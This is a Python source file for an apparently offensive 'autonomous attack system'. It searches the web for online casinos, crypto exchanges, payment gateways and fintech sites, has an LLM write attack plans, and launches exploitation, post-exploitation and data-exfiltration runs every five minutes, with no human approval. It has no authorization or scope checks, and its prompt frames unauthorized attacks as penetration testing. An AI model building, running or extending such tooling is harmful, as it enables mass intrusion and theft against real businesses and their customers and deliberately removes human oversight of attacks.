"""
Autonomous Orchestrator - Fully Autonomous Attack System

This orchestrator runs 24/7 without human intervention.
It automatically:
1. Discovers targets using TargetAcquisitionAgent
2. Selects the best target
3. Generates custom attack workflow using AI
4. Executes the attack
5. Repeats the cycle

No --target or --workflow parameters needed!
"""

import asyncio
from typing import Dict, Any, Optional
from loguru import logger
from datetime import datetime
import uuid

from agents.target_acquisition_agent import TargetAcquisitionAgent
from core.attack_orchestrator import AttackOrchestrator
from core.ai_attack_strategist import AIAttackStrategist
from api.database.db_service import db


class AutonomousOrchestrator:
    """
    Fully autonomous attack orchestrator.
    
    Runs continuously, discovering and attacking targets without human input.
    """
    
    def __init__(
        self,
        keywords: list = None,
        attack_interval: int = 300,  # 5 minutes between attacks
        max_concurrent_attacks: int = 3
    ):
        """
        Initialize Autonomous Orchestrator.
        
        Args:
            keywords: Keywords for target discovery
            attack_interval: Seconds to wait between attacks
            max_concurrent_attacks: Maximum number of concurrent attacks
        """
        self.keywords = keywords or [
            "online casino",
            "betting site",
            "crypto exchange",
            "payment gateway",
            "fintech startup"
        ]
        
        self.attack_interval = attack_interval
        self.max_concurrent_attacks = max_concurrent_attacks
        
        self.target_agent = TargetAcquisitionAgent(keywords=self.keywords)
        self.attack_orchestrator = AttackOrchestrator()
        self.ai_strategist = AIAttackStrategist()
        
        self.running = False
        self.active_attacks = {}
        self.attack_history = []
        
    async def start(self):
        """
        Start the autonomous attack cycle.
        
        This runs forever until stopped.
        """
        logger.info("🤖 Starting Autonomous Orchestrator")
        logger.info(f"   Keywords: {self.keywords}")
        logger.info(f"   Attack Interval: {self.attack_interval}s")
        logger.info(f"   Max Concurrent: {self.max_concurrent_attacks}")
        
        self.running = True
        
        try:
            async with self.target_agent:
                while self.running:
                    await self._attack_cycle()
                    
                    # Wait before next cycle
                    logger.info(f"⏳ Waiting {self.attack_interval}s before next cycle...")
                    await asyncio.sleep(self.attack_interval)
                    
        except KeyboardInterrupt:
            logger.info("⚠️  Stopping Autonomous Orchestrator (Ctrl+C)")
            self.running = False
            
        except Exception as e:
            logger.error(f"❌ Autonomous Orchestrator error: {e}")
            raise
            
        finally:
            await self._cleanup()
    
    async def _attack_cycle(self):
        """
        Single attack cycle:
        1. Discover targets
        2. Select best target
        3. Generate attack workflow
        4. Execute attack
        """
        try:
            # Check if we can start new attack
            if len(self.active_attacks) >= self.max_concurrent_attacks:
                logger.info(f"⏸️  Max concurrent attacks reached ({self.max_concurrent_attacks})")
                return
            
            logger.info("🎯 Starting new attack cycle")
            
            # Step 1: Discover targets
            logger.info("🔍 Step 1: Target Discovery")
            best_target = await self.target_agent.get_best_target()
            
            if not best_target:
                logger.warning("⚠️  No suitable targets found")
                return
            
            target_url = best_target['url']
            logger.info(f"✅ Best target selected: {target_url}")
            logger.info(f"   Score: {best_target['score']}")
            logger.info(f"   Technologies: {', '.join(best_target.get('technologies', []))}")
            
            # Step 2: Generate custom attack workflow using AI
            logger.info("🧠 Step 2: AI Workflow Generation")
            workflow = await self.ai_strategist.generate_workflow(best_target)
            
            logger.info(f"✅ Attack workflow generated:")
            logger.info(f"   Phases: {len(workflow.get('phases', []))}")
            logger.info(f"   Agents: {', '.join(workflow.get('agents', []))}")
            
            # Step 3: Create attack session
            attack_id = str(uuid.uuid4())
            
            await db.create_attack(
                attack_id=attack_id,
                target_url=target_url,
                attack_mode='autonomous',
                target_info=best_target,
                workflow=workflow
            )
            
            # Step 4: Execute attack in background
            logger.info(f"🚀 Step 3: Launching attack {attack_id}")
            
            task = asyncio.create_task(
                self._execute_attack(attack_id, target_url, workflow)
            )
            
            self.active_attacks[attack_id] = {
                'task': task,
                'target_url': target_url,
                'started_at': datetime.now(),
                'workflow': workflow
            }
            
            logger.info(f"✅ Attack {attack_id} launched successfully")
            logger.info(f"   Active attacks: {len(self.active_attacks)}")
            
        except Exception as e:
            logger.error(f"❌ Attack cycle failed: {e}")
            import traceback
            logger.error(traceback.format_exc())
    
    async def _execute_attack(
        self,
        attack_id: str,
        target_url: str,
        workflow: Dict
    ):
        """
        Execute attack with custom workflow.
        
        Args:
            attack_id: Attack session ID
            target_url: Target URL
            workflow: AI-generated workflow
        """
        try:
            logger.info(f"⚔️  Executing attack {attack_id}")
            
            # Execute attack using orchestrator
            results = await self.attack_orchestrator.start_attack(
                attack_id=attack_id,
                target_url=target_url,
                attack_mode='autonomous'
            )
            
            # Log results
            logger.info(f"✅ Attack {attack_id} completed")
            logger.info(f"   Vulnerabilities: {len(results.get('vulnerabilities', []))}")
            logger.info(f"   Exploits: {len(results.get('exploits', []))}")
            logger.info(f"   Data exfiltrated: {len(results.get('exfiltrated_data', []))}")
            
            # Add to history
            self.attack_history.append({
                'attack_id': attack_id,
                'target_url': target_url,
                'completed_at': datetime.now(),
                'results': results
            })
            
        except Exception as e:
            logger.error(f"❌ Attack {attack_id} failed: {e}")
            
            await db.update_attack(
                attack_id,
                status='failed',
                error=str(e)
            )
            
        finally:
            # Remove from active attacks
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]
    
    async def _cleanup(self):
        """Cleanup resources and wait for active attacks."""
        logger.info("🧹 Cleaning up...")
        
        if self.active_attacks:
            logger.info(f"⏳ Waiting for {len(self.active_attacks)} active attacks to complete...")
            
            tasks = [attack['task'] for attack in self.active_attacks.values()]
            await asyncio.gather(*tasks, return_exceptions=True)
        
        logger.info("✅ Cleanup complete")
    
    def stop(self):
        """Stop the autonomous orchestrator."""
        logger.info("🛑 Stopping Autonomous Orchestrator...")
        self.running = False
    
    def get_status(self) -> Dict[str, Any]:
        """Get current status of autonomous orchestrator."""
        return {
            'running': self.running,
            'active_attacks': len(self.active_attacks),
            'total_attacks': len(self.attack_history),
            'keywords': self.keywords,
            'attack_interval': self.attack_interval,
            'max_concurrent': self.max_concurrent_attacks,
            'active_attack_ids': list(self.active_attacks.keys())
        }


class AIAttackStrategist:
    """
    AI-powered attack strategist.
    
    Generates custom attack workflows based on target characteristics.
    """
    
    def __init__(self):
        self.llm_provider = None  # Will be initialized when needed
    
    async def generate_workflow(self, target: Dict) -> Dict:
        """
        Generate custom attack workflow using LLM.
        
        Args:
            target: Target information from TargetAcquisitionAgent
            
        Returns:
            Custom attack workflow
        """
        logger.info("🧠 Generating custom attack workflow with AI")
        
        # Extract target characteristics
        url = target.get('url', '')
        technologies = target.get('technologies', [])
        server = target.get('server', 'Unknown')
        
        # Build prompt for LLM
        prompt = f"""You are an expert penetration testing strategist.

Target Information:
- URL: {url}
- Technologies: {', '.join(technologies) if technologies else 'Unknown'}
- Server: {server}

Generate a custom attack workflow for this target. Consider:
1. What vulnerabilities are most likely based on the technologies?
2. What attack sequence would be most effective?
3. What agents should be used and in what order?

Provide a structured attack plan with phases and specific agents to use.

Output format:
{{
    "phases": ["reconnaissance", "scanning", "exploitation", "post_exploitation"],
    "agents": ["agent1", "agent2", "agent3"],
    "priority_vulnerabilities": ["sqli", "xss", "ssrf"],
    "attack_strategy": "description of strategy"
}}
"""
        
        try:
            # Try to use LLM for workflow generation
            from core.llm_provider import get_llm_response
            
            response = await get_llm_response(prompt)
            
            # Parse LLM response
            import json
            workflow = json.loads(response)
            
            logger.info("✅ AI-generated workflow created")
            
        except Exception as e:
            logger.warning(f"⚠️  LLM workflow generation failed, using default: {e}")
            
            # Fallback to default workflow based on technologies
            workflow = self._generate_default_workflow(target)
        
        return workflow
    
    def _generate_default_workflow(self, target: Dict) -> Dict:
        """Generate default workflow based on target characteristics."""
        technologies = target.get('technologies', [])
        
        # Default workflow
        workflow = {
            'phases': [
                'reconnaissance',
                'scanning',
                'vulnerability_analysis',
                'exploitation',
                'post_exploitation',
                'data_exfiltration'
            ],
            'agents': [
                'sqlmap_agent',
                'xss_hunter',
                'command_injection_exploiter',
                'ssrf_agent_weaponized',
                'auth_bypass_agent'
            ],
            'priority_vulnerabilities': ['sqli', 'xss', 'command_injection'],
            'attack_strategy': 'Comprehensive automated attack'
        }
        
        # Customize based on technologies
        if 'wordpress' in technologies:
            workflow['agents'].insert(0, 'wordpress_scanner')
            workflow['priority_vulnerabilities'].insert(0, 'wordpress_vulns')
            
        if 'cloudflare' in technologies:
            workflow['attack_strategy'] += ' with WAF bypass techniques'
        
        return workflow


async def main():
    """Run the Autonomous Orchestrator."""
    # Initialize database connection
    await db.connect()
    
    try:
        # Create autonomous orchestrator
        orchestrator = AutonomousOrchestrator(
            keywords=[
                "online casino",
                "betting site",
                "crypto exchange"
            ],
            attack_interval=300,  # 5 minutes
            max_concurrent_attacks=3
        )
        
        # Start autonomous operation
        await orchestrator.start()
        
    finally:
        await db.disconnect()


if __name__ == "__main__":
    import logging
    logging.basicConfig(level=logging.INFO)
    
    asyncio.run(main())

